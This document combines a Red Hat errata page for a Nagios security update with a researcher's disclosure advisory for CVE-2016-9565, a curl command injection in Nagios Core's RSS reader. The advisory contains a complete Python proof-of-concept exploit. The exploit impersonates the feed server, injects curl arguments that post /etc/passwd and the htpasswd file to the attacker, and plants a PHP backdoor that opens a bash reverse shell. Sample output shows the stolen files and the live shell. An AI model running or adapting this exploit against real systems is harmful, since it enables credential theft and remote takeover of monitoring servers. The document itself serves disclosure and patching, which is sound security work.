  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:0212 - Security Advisory

Issued:
2017-01-31
Updated:
2017-01-31
# RHSA-2017:0212 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: nagios security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0212)

## Topic

An update for nagios is now available for Red Hat Enterprise Linux OpenStack Platform 5.0 (Icehouse) for RHEL 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Nagios is a program that monitors hosts and services on your network, and has the ability to send email or page alerts when a problem arises or is resolved. Nagios is written in C and designed to run under Linux (and some other \*NIX variants) as a background process, intermittently running checks on various services that you specify. The actual service checks are performed by separate "plugin" programs which return the status of the checks to Nagios. Nagios plugins are available at <http://sourceforge.net/projects/nagiosplug.> This package provides the core program, web interface, and documentation files for Nagios. Development files are built as a separate package.

Security Fix(es):

* Various command-execution flaws were found in the Snoopy library included with Nagios. These flaws allowed remote attackers to execute arbitrary commands by manipulating Nagios HTTP headers. (CVE-2008-7313, CVE-2014-5008, CVE-2014-5009)
* It was found that an attacker who could control the content of an RSS feed could execute code remotely using the Nagios web interface. This flaw could be used to gain access to the remote system and in some scenarios control over the system. (CVE-2016-9565)
* A privileges flaw was found in Nagios where log files were unsafely handled. An attacker who could control Nagios logging configuration ('nagios' user/group) could exploit the flaw to elevate their access to that of a privileged user. (CVE-2016-9566)

Red Hat would like to thank Dawid Golunski for reporting CVE-2016-9565 and CVE-2016-9566.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat OpenStack 5.0 for RHEL 6 x86\_64

## Fixes

* [BZ - 1121497](https://bugzilla.redhat.com/show_bug.cgi?id=1121497)
  - CVE-2008-7313 CVE-2014-5008 CVE-2014-5009 snoopy: incomplete fixes for command execution flaws
* [BZ - 1402869](https://bugzilla.redhat.com/show_bug.cgi?id=1402869)
  - CVE-2016-9566 nagios: Privilege escalation issue
* [BZ - 1405363](https://bugzilla.redhat.com/show_bug.cgi?id=1405363)
  - CVE-2016-9565 nagios: Command injection via curl in MagpieRSS

## CVEs

* [CVE-2008-7313](https://www.redhat.com/security/data/cve/CVE-2008-7313.html)
* [CVE-2014-5008](https://www.redhat.com/security/data/cve/CVE-2014-5008.html)
* [CVE-2014-5009](https://www.redhat.com/security/data/cve/CVE-2014-5009.html)
* [CVE-2016-9565](https://www.redhat.com/security/data/cve/CVE-2016-9565.html)
* [CVE-2016-9566](https://www.redhat.com/security/data/cve/CVE-2016-9566.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat OpenStack 5.0 for RHEL 6

| SRPM | |
| --- | --- |
| nagios-3.5.1-9.el6.src.rpm | SHA-256: c51d0665f2a49e63240d513a46c6e8522fe3e9adf4f1c7537476c568d4861230 |
| x86\_64 | |
| nagios-3.5.1-9.el6.x86\_64.rpm | SHA-256: 3a98a75832187d4da3b1868fb633c005618184bd6aa3f2ab0645124882b1ffb8 |
| nagios-common-3.5.1-9.el6.x86\_64.rpm | SHA-256: 82b833d5d39d61173368cf8caaa4e35a67fe69d24410a425f335597eedf45c5f |
| nagios-debuginfo-3.5.1-9.el6.x86\_64.rpm | SHA-256: 1692b15d40b8c6e40dbedc5e1908ef37bae998afbc9902bc5a7c4d806723a7b4 |
| nagios-devel-3.5.1-9.el6.x86\_64.rpm | SHA-256: 635845262ad91c5f19ba97ba7a27136d3f8e4f8bd210b0dda19d28802ab49460 |

The Red Hat security contact is secalert@redhat.com.
More contact details at <https://access.redhat.com/security/team/contact/>.

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from legalhackers.com_2cbeaa21_20250126_033741.html ===

```

[__                     __   __  __           __
   / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
  / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
 / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
/_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/](https://legalhackers.com)

 [<-- BACK TO legalhackers.com](https://legalhackers.com)

[Follow @dawid_golunski](https://twitter.com/dawid_golunski)

~~~~~~~~~~~~~ ExploitBox.io ~~~~~~~~~~~~~~~~
Interested in security / vulns / exploits ?
[![](../exploitbox_logo.png)
ExploitBox.io
A Playground & Labs for security folks into
hacking & the art of exploitation](https://ExploitBox.io)

[Follow @Exploit_Box](https://twitter.com/Exploit_Box)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

=============================================
- Discovered by: Dawid Golunski
- dawid[at]legalhackers.com
- <https://legalhackers.com>

- CVE-2016-9565
- Release date: 13.12.2016
- Revision 2.0
- Severity: High / Critical
=============================================

I. VULNERABILITY
-------------------------

Nagios Core < 4.2.2        Curl Command Injection / Remote Code Execution

II. BACKGROUND
-------------------------

"Nagios Is The Industry Standard In IT Infrastructure Monitoring

Achieve instant awareness of IT infrastructure problems, so downtime doesn't
adversely affect your business.

Nagios offers complete monitoring and alerting for servers, switches,
applications, and services."

<https://www.nagios.org/>

III. INTRODUCTION
-------------------------

Nagios Core comes with a PHP/CGI front-end which allows to view status
of the monitored hosts.
This front-end contained a Command Injection vulnerability in a RSS feed reader
class that loads (via insecure clear-text HTTP or HTTPS accepting self-signed
certificates) the latest Nagios news from a remote RSS feed (located on the
vendor's server on the Internet) upon log-in to the Nagios front-end.
The vulnerability could potentially enable remote unauthenticated attackers who
 managed to impersonate the feed server (via DNS poisoning, domain hijacking,
ARP spoofing etc.), to provide a malicious response that injects parameters to
curl command used by the affected RSS client class and effectively
read/write arbitrary files on the vulnerable Nagios server.
This could lead to Remote Code Execution in the context of www-data/nagios user
on default Nagios installs that follow the official setup guidelines.

IV. DESCRIPTION
-------------------------

Vulnerability
~~~~~~~~~~~~~~~

The vulnerability was caused by the use of a vulnerable component for handling
RSS news feeds - MagpieRSS in Nagios Core control panel / front-end.
The component was used by Nagios front-end to load news feeds from remote
feed source upon log-in.
The component was found vulnerable to CVE-2008-4796.

Below are relevant parts of code from the vulnerable RSS class:

----------------------------------------------------

function fetch($URI)
{
...
	case "https":
		...
		$path = $URI_PARTS["path"].($URI_PARTS["query"] ? "?".$URI_PARTS["query"] : "");
		$this->_httpsrequest($path, $URI, $this->_httpmethod);
		...
}
...
function _httpsrequest($url,$URI,$http_method,$content_type="",$body="")
{
	# accept self-signed certs
	$cmdline_params .= " -k";
	exec($this->curl_path." -D \"/tmp/$headerfile\"".escapeshellcmd($cmdline_params)." ".escapeshellcmd($URI),$results,$return);

---------------------------------------------------------

As can be seen, the _httpsrequest function uses a curl command to handle HTTPS
requests. The sanitization used to escape $URI did not prevent injection of
additional parameters to curl command which made it possible to, for example, get
curl to write out the https response to an arbitrary file with the $URI:

<https://attacker-svr> -o /tmp/result_file

The vulnerability was reported to Nagios security team.
Nagios 4.2.0 was released which contained the following fix for CVE-2008-4796:

---------------------------------------------------------

# accept self-signed certs
$cmdline_params .= " -k";
exec($this->curl_path." -D \"/tmp/$headerfile\"".$cmdline_params." \"".escapeshellcmd($URI)."\"",$results,$return);

---------------------------------------------------------

Further research found the fix to be incomplete as the extra sanitization
by the above patch could be bypassed by adding extra quote characters in
the $URI variable e.g:

<https://attacker-svr"> -o /tmp/nagioshackedagain "

This vulnerability has been assigned CVE-2016-9565 and was addressed by Nagios
team in the new release of Nagios 4.2.2 by removing the vulnerable class.

Injection Point / Controling $URI var
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The affected versions of Nagios Core front-end contain three files that trigger
the _httpsrequest() function with the injectable curl command shown above:

- rss-corefeed.php
- rss-corebanner.php
- rss-newsfeed.php

These are used to fetch news via an RSS feed from www.nagios.org website via
HTTP or HTTPS (see the notes below) protocols.
The news are displayed on the Home page of the Nagios front-end upon log-in.

All 3 scripts call fetch_rss() as follows:

------[ rss-corefeed.php ]------

<?php

//build splash divs to ajax load
do_corefeed_html();

function do_corefeed_html() {

        $url="[http://www.nagios.org/backend/feeds/corepromo";](http://www.nagios.org/backend/feeds/corepromo%22)
        $rss=fetch_rss($url);
        $x=0;
        //build content string
        if($rss) {
                $html ="
                <ul>";

                foreach ($rss->items as $item){
                        $x++;
                        if($x>3)
                                break;
                        //$href = $item['link'];
                        //$title = $item['title'];
                        $desc = $item['description'];
                        $html .="<li>{$item['description']}</li>";
                        }
                $html .="</ul>";

                print $html;

--------------------------------

An attacker who managed to impersonate www.nagios.org domain and respond to the web
request made by the fetch_rss() function could send a malicious 302 redirect to set
$URI variable from the _httpsrequest() function to an arbitrary value and thus
control the curl command parameters.

For example, the following redirect:

Location: <https://attackers-host/get-data.php> -Fpasswd=@/etc/passwd

would execute curl with the parameters:

curl -D /tmp/$headerfile <https://attackers-host/get-data.php> -Fpasswd=@/etc/passwd

and send the contents of the pnsswd file from the Nagios system to the attacker's
server in a POST request.

Attack Vectors
~~~~~~~~~~~~~~~~~~

In order to supply a malicious response to fetch_rss() the attacker would
need to impersonate the www.nagios.org domain in some way.
Well-positioned attackers within the target's network could try network
attacks such as DNS spoofing, ARP poisoning etc.

A compromised DNS server/resolver within an organisation could be used by
attackers to exploit the Nagios vulnerability to gain access to the monitoring
server.

The vulnerability could potentially become an Internet threat and be used to
exploit a large number of affected Nagios installations in case of a compromise
of a DNS server/resolver belonging to a large-scale ISP.

Notes
~~~~~~~~~~~~~~~~~~

[*] Nagios front-end in versions <= 4.0.5 automatically load the rss-*.php files
upon login to the Nagios control panel. Later versions contain the
vulnerable scripts but do not load them automatically.
On such installations an attacker could still be successful in one of the cases:

a) if attacker had low-privileged access (guest/viewer account) to the control
panel and was able to execute /nagios/rss-newsfeed.php script

b) perform a CSRF attack / entice a logged-in nagios user to open the URL:
   <http://nagios-server/nagios/rss-newsfeed.php>

c) well-positioned attackers on the network might be able to modify the
traffic and inject a redirect to /rss-newsfeed.php script when Nagios control
panel is accessed via HTTP by an authenticated user

[*] The rss-*.php scripts in Nagios Core >=4.0.8 use HTTPS to fetch news feeds
however as has been previously shown in _httpsrequest() function, the curl
command gets passed a '-k' (--insecure) parameter which accepts self-signed
certificates.

Arbitrary Code Execution
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nagios Core installations that follow the official installation guidelines:

<https://assets.nagios.com/downloads/nagioscore/docs/Installing_Nagios_Core_From_Source.pdf>

as well as the commercial Nagios VMs available for purchase on the vendor website
make the web-server user (www-data) part of the 'nagios' group which has
write access to the web document root (/usr/local/nagios/share).

This can allow attackers who manage to exploit the vulnerability and
inject parameters to curl command to save a PHP backdoor within the document
root via a 302 redirect similar to:

Location: <http://attacker/php-backdoor.php> --trace-ascii /usr/local/nagios/share/nagios-backdoor.php

and have it executed automatically upon a log-in to the Nagios control panel via html/JS code
snippet returned as a part of the RSS feed as demonstrated by the PoC exploit below.

The privileges could then be raised from nagios user to root via another Nagios
vulnerability discovered by the author of this advisory CVE-2016-9566:

<http://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

V. PROOF OF CONCEPT
-------------------------

Below is an exploit that demonstrates reading, writing, and code execution
on affected Nagios installations.
The attack flow is as follows:

For simplicity, to test the attack vector, a static DNS entry can be added
inside the /etc/hosts file on the victim Nagios server to point the
www.nagios.org domain at an attacker's IP where the exploit is executed.

----------[ nagios_cmd_injection.py ]----------

#!/usr/bin/env python
intro = """\033[94m
Nagios Core < 4.2.0 Curl Command Injection / Code Execution PoC Exploit
CVE-2016-9565
nagios_cmd_injection.py ver. 1.0

Discovered & Coded by:

Dawid Golunski
<https://legalhackers.com>
\033[0m
"""
usage = """
This PoC exploit can allow well-positioned attackers to extract and write
arbitrary files on the Nagios server which can lead to arbitrary code execution
on Nagios deployments that follow the official Nagios installation guidelines.

For details, see the full advisory at:
<https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

PoC Video:
<https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

Follow <https://twitter.com/dawid_golunski> for updates on this advisory.

Remember you can turn the nagios shell into root shell via CVE-2016-9565:
<https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

Usage:

./nagios_cmd_injection.py reverse_shell_ip [reverse_shell_port]

Disclaimer:
For testing purposes only. Do no harm.

"""

import os
import sys
import time
import re
import tornado.httpserver
import tornado.web
import tornado.ioloop

exploited  = 0
docroot_rw = 0

class MainHandler(tornado.web.RequestHandler):

    def get(self):
	global exploited
	if (exploited == 1):
		self.finish()
	else:
		ua  = self.request.headers['User-Agent']
		if "Magpie" in ua:
			print "[+] Received GET request from Nagios server (%s) ! Sending redirect to inject our curl payload:\n" % self.request.remote_ip
			print  '-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '\n'
			self.redirect('<https://'> + self.request.host + '/nagioshack -Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path, permanent=False)
			exploited = 1

    def post(self):
        global docroot_rw
	print "[+] Success, curl payload injected! Received data back from the Nagios server %s\n" % self.request.remote_ip

	# Extract /etc/passwd from the target
        passwd = self.request.files['passwd'][0]['body']
	print "[*] Contents of /etc/passwd file from the target:\n\n%s" % passwd

	# Extract /usr/local/nagios/etc/htpasswd.users
        htauth = self.request.files['htauth'][0]['body']
	print "[*] Contents of /usr/local/nagios/etc/htpasswd.users file:\n\n%s" % htauth

	# Extract nagios group from /etc/group
        group = self.request.files['group'][0]['body']
	for line in group.splitlines():
	    if "nagios:" in line:
		nagios_group = line
		print "[*] Retrieved nagios group line from /etc/group file on the target: %s\n" % nagios_group
	if "www-data" in nagios_group:
		print "[+] Happy days, 'www-data' user belongs to 'nagios' group! (meaning writable webroot)\n"
		docroot_rw = 1

	# Put backdoor PHP payload within the 'Server' response header so that it gets properly saved via the curl 'trace-ascii'
	# option. The output trace should contain  an unwrapped line similar to:
	#
	# == Info: Server <?php system("/bin/bash -c 'nohup bash -i >/dev/tcp/192.168.57.3/8080 0<&1 2>&1 &'"); ?> is not blacklisted
	#
	# which will do the trick as it won't mess up the payload :)
	self.add_header('Server', backdoor)

	# Return XML/feed with JavaScript payload that will run the backdoor code from nagios-backdoor.php via <img src=> tag :)
	print "[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :) \n"
	self.write(xmldata)

	self.finish()
	tornado.ioloop.IOLoop.instance().stop()

if __name__ == "__main__":
    global backdoor_path
    global backdoor

    print intro

    # Set attacker's external IP & port to be used by the reverse shell
    if len(sys.argv) < 2 :
	   print usage
	   sys.exit(2)
    attacker_ip   = sys.argv[1]
    if len(sys.argv) == 3 :
	   attacker_port = sys.argv[1]
    else:
	   attacker_port = 8080

    # PHP backdoor to be saved on the target Nagios server
    backdoor_path = '/usr/local/nagios/share/nagios-backdoor.php'
    backdoor = """<?php system("/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1 &'"); die("stop processing"); ?>""" % (attacker_ip, attacker_port)

    # Feed XML containing JavaScript payload that will load the nagios-backdoor.php script
    global xmldata
    xmldata = """<?xml version="1.0"?>
    <rss version="2.0">
          <channel>
            <title>Nagios feed with injected JS payload</title>
            <item>
              <title>Item 1</title>
              <description>

                &lt;strong&gt;Feed injected. Here we go &lt;/strong&gt; -
                loading /nagios/nagios-backdoor.php now via img tag... check your netcat listener for nagios shell ;)

                &lt;img src=&quot;/nagios/nagios-backdoor.php&quot; onerror=&quot;alert('Reverse Shell /nagios/nagios-backdoor.php executed!')&quot;&gt;

              </description>

            </item>

          </channel>
    </rss> """

    # Generate SSL cert
    print "[+] Generating SSL certificate for our python HTTPS web server \n"
    os.system("echo -e '\n\n\n\n\n\n\n\n\n' | openssl req  -nodes -new -x509  -keyout server.key -out server.cert 2>/dev/null")

    print "[+] Starting the web server on ports 80 & 443 \n"
    application = tornado.web.Application([
        (r'/.*', MainHandler)
    ])
    application.listen(80)
    http_server = tornado.httpserver.HTTPServer(
        application,
        ssl_options = {
            "certfile": os.path.join("./", "server.cert"),
            "keyfile": os.path.join("./", "server.key"),
        }
    )
    http_server.listen(443)

    print "[+] Web server ready for connection from Nagios ([http://target-svr/nagios/rss-corefeed.php).](http://target-svr/nagios/rss-corefeed.php%29.) Time for your dnsspoof magic... ;)\n"
    tornado.ioloop.IOLoop.current().start()

    if (docroot_rw == 1):
	    print "[+] PHP backdoor should have been saved in %s on the target by now!\n" % backdoor_path
	    print "[*] Spawning netcat and waiting for the nagios shell (remember you can escalate to root via CVE-2016-9566 :)\n"
	    os.system("nc -v -l -p 8080")
	    print "\n[+] Shell closed\n"

    print "[+] That's all. Exiting\n"

-----------------------------------------------

Video PoC
~~~~~~~~~~~~~

<https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

Example exploit run
~~~~~~~~~~~~~~~~~~~~~

root@xenial:~/nagios-exploit# ./nagios_cmd_injection.py 192.168.57.3

Nagios Core < 4.2.0 Curl Command Injection / Code Execution PoC Exploit
CVE-2016-9565
nagios_cmd_injection.py ver. 1.0

Discovered & Coded by:

 Dawid Golunski
 <https://legalhackers.com>

[+] Generating SSL certificate for our python HTTPS web server

[+] Starting the web server on ports 80 & 443

[+] Web server ready for connection from Nagios ([http://target-svr/nagios/rss-corefeed.php).](http://target-svr/nagios/rss-corefeed.php%29.) Time for your dnsspoof magic... ;)

[+] Received GET request from Nagios server (192.168.57.4) ! Sending redirect to inject our curl payload:

-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii /usr/local/nagios/share/nagios-backdoor.php

[+] Success, curl payload injected! Received data back from the Nagios server 192.168.57.4

[*] Contents of /etc/passwd file from the target:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
nagios:x:1001:1001::/home/nagios:/bin/sh
[..cut..]

[*] Contents of /usr/local/nagios/etc/htpasswd.users file:

nagiosadmin:$apr1$buzCfFb$GjV/ga6PHp53qePf0

[*] Retrieved nagios group line from /etc/group file on the target: nagios:x:1001:www-data

[+] Happy days, 'www-data' user belongs to 'nagios' group! (meaning writable webroot)

[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :)

[+] PHP backdoor should have been saved in /usr/local/nagios/share/nagios-backdoor.php on the target by now!

[*] Spawning netcat and waiting for the nagios shell (remember you can escalate to root via CVE-2016-9566 :)

Listening on [0.0.0.0] (family 0, port 8080)
Connection from [192.168.57.4] port 8080 [tcp/http-alt] accepted (family 2, sport 38718)

www-data@debjessie:/usr/local/nagios/share$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)

www-data@debjessie:/usr/local/nagios/share$ groups
groups
www-data nagios nagcmd

www-data@debjessie:/usr/local/nagios/share$ cat nagios-backdoor.php
[..cut..]
== Info: Server <?php system("/bin/bash -c 'nohup bash -i >/dev/tcp/192.168.57.3/8080 0<&1 2>&1 &'"); die("stop processing"); ?> is not blacklisted
[..cut..]
www-data@debjessie:/usr/local/nagios/share$ ls -ld .
ls -ld .
drwxrwsr-x 16 nagios nagios 4096 Dec  9 20:00 .

www-data@debjessie:/usr/local/nagios/share$ exit
exit
exit

[+] Shell closed

[+] That's all. Exiting

VI. BUSINESS IMPACT
-------------------------

Successfull exploitation of the vulnerability could allow remote attackers
to extract sensitive data from the Nagios monitoring server as well as
achieve arbitrary code execution as demonstrated by the exploit.
The monitoring server is usually critical within an organisation as it
often has remote access to all hosts within the network. For this reason
a compromise could likely allow attackers to expand their access within
the network to other internal servers.

Corporate monitoring servers with a large number of connected hosts are
often left unpatched due to their sensitive/central role on the network
which increase the chances of exploitation.

As explained in the description section, the vulnerability could be a threat
coming from the Internet. If a major ISP / DNS, or nagios.org site itself was
compromised, this could potentially allow attackers to exploit the vulnerability
on multiple Nagios installations which retrieve RSS feeds automatically and the
corporate firewall does not stop the egress traffic from the monitoring server.
As a result, an attacker could potentially gain unauthorised access to
affected Nagios installations without even knowing the target IP addresses
and despite a lack of direct access to the target (blocked igress traffic on
the firewall).

VII. SYSTEMS AFFECTED
-------------------------

Both of the Nagios Core stable branches 3.x and 4.x are affected.

The vulnerability was disclosed responsibly to the vendor and was fully fixed
in Nagios Core 4.2.2.

Nagios Core versions <= 4.0.5 are at the highest risk as they are the easiest
to exploit (automatically load the vulnerable scripts upon log-in to the Nagios
control panel).

VIII. SOLUTION
-------------------------

Update to the latest Nagios Core release.

IX. REFERENCES
-------------------------

<https://legalhackers.com>

This advisory (CVE-2016-9565) URL:
<https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

Root Privilege Escalation from nagios system user to root (CVE-2016-9566):
<https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html>

Video PoC:
<https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

Exploit source code:
<https://legalhackers.com/exploits/CVE-2016-9565/nagios_cmd_injection.py>

<https://www.nagios.org>

Nagios patch history:
<https://www.nagios.org/projects/nagios-core/history/4x/>

MagpieRSS CVE-2008-4796:
<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4796>

Nagios Core installation guide:
<https://assets.nagios.com/downloads/nagioscore/docs/Installing_Nagios_Core_From_Source.pdf>

X. CREDITS
-------------------------

The vulnerability has been discovered by Dawid Golunski
